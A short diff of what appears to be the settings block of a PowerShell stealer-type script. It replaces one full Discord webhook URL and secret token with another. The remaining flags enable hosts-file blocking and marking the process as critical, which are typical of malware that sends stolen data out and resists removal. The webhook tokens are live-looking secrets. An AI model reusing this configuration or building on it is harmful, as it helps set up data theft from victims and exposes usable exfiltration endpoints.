@@ -1,4 +1,4 @@
-$webhook = "https://discord.com/api/webhooks/1249376163432759316/U2nSmBu9XJ5dB5KiAu4eHxENyi3a-OqpwHH7W4ScCA0bAEWVUFsuSY4i3vWdbqJQ8iU9" 
+$webhook = "https://discord.com/api/webhooks/1251938579307958403/Qaxju-CGPMJ7ngRoCZbnsq20FIYrfWIZUcZf2I9DYgG3yuClI3GGpTEv0T1DBceXNwFx" 
 $debug = $true
 $blockhostsfile = $true
 $criticalprocess = $true
